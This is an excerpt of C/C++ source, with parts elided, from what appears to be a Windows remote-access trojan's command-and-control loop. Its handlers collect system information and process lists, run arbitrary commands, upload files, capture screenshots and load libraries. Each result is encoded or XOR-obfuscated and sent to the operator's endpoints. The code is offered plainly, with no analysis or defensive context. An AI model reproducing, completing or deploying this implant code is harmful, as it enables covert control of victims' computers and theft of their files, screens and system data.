...
//int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd) {
	...
	while (true) {
		...
		case 2:
			//INFO
			sendEncodedString(c.key, gatherInfo(hInternet), c.endpoints.info, hConnect);
			break;
		case 3:
			//PS
			sendEncodedString(c.key, getProcToStr(), c.endpoints.ps, hConnect);
			break;
		case 4:
			//RUN
			sendEncodedString(c.key, execCmd(response.substr(response.find(" ") + 1), c.cmdtimeout), c.endpoints.out, hConnect);
			break;
		case 5:
			//UPLOAD
			doFileUpload(hConnect, (char*) response.substr(response.find(" ") + 1).c_str(), c.xorKey, c.endpoints.upload.c_str());
			break;
		case 6:
			//DOWNLOAD
			first = response.find(" ");
		...
		case 8:
			//SCREENSHOT
			doScreenshotUpload(hConnect, takeScreenshotAndSaveToMemory(), c.xorKey, c.endpoints.upload.c_str());
			break;
		case 9:
			//LOADLIBRARY
